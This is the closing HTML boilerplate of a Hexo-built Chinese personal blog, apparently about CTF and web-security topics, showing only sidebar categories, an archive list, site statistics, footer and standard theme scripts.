            <li class="card-category-list-item "><a class="card-category-list-link" href="/categories/CTF%E8%B5%9B%E9%A2%98/"><span class="card-category-list-name">CTF赛题</span><span class="card-category-list-count">2</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/web%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/"><span class="card-category-list-name">web基础漏洞</span><span class="card-category-list-count">7</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/%E6%B8%97%E9%80%8F/"><span class="card-category-list-name">渗透</span><span class="card-category-list-count">1</span></a></li>
            </ul></div><div class="card-widget card-archives"><div class="item-headline"><i class="fas fa-archive"></i><span>归档</span></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/01/"><span class="card-archive-list-date">一月 2024</span><span class="card-archive-list-count">11</span></a></li></ul></div><div class="card-widget card-webinfo"><div class="item-headline"><i class="fas fa-chart-line"></i><span>网站资讯</span></div><div class="webinfo"><div class="webinfo-item"><div class="item-name">文章数目 :</div><div class="item-count">11</div></div><div class="webinfo-item"><div class="item-name">已运行时间 :</div><div class="item-count" id="runtimeshow" data-publishdate="2024-01-23T02:27:20.613Z"><i class="fa-solid fa-spinner fa-spin"></i></div></div><div class="webinfo-item"><div class="item-name">本站访客数 :</div><div class="item-count" id="busuanzi_value_site_uv"><i class="fa-solid fa-spinner fa-spin"></i></div></div><div class="webinfo-item"><div class="item-name">本站总访问量 :</div><div class="item-count" id="busuanzi_value_site_pv"><i class="fa-solid fa-spinner fa-spin"></i></div></div><div class="webinfo-item"><div class="item-name">最后更新时间 :</div><div class="item-count" id="last-push-date" data-lastpushdate="2024-01-23T02:27:20.613Z"><i class="fa-solid fa-spinner fa-spin"></i></div></div></div></div></div></div></main><footer id="footer" style="background: transparent"><div id="footer-wrap"><div class="copyright">©2024 By Bamboo22</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.12.0"></script><script src="/js/main.js?v=4.12.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.32/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"><script>window.typedJSFn = {
  init: (str) => {
    window.typed = new Typed('#subtitle', Object.assign({
      strings: str,
      startDelay: 300,
      typeSpeed: 150,
      loop: true,
      backSpeed: 50,
    }, null))
  },
  run: (subtitleType) => {
    if (true) {
      if (typeof Typed === 'function') {
        subtitleType()
      } else {
        getScript('https://cdn.jsdelivr.net/npm/typed.js@2.1.0/dist/typed.umd.min.js').then(subtitleType)
      }
    } else {
      subtitleType()
    }
  }
}
</script><script>function subtitleType () {
  if (true) {
    typedJSFn.init(["竹杖芒鞋轻胜马，谁怕？一蓑烟雨任平生"])
  } else {
    document.getElementById("subtitle").textContent = "竹杖芒鞋轻胜马，谁怕？一蓑烟雨任平生"
  }
}
typedJSFn.run(subtitleType)</script></div><script id="click-heart" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/click-heart.min.js" async="async" mobile="true"></script><script async="" data-pjax="" src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"></div></div><hr><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=4.12.0"></script></div></div></body></html>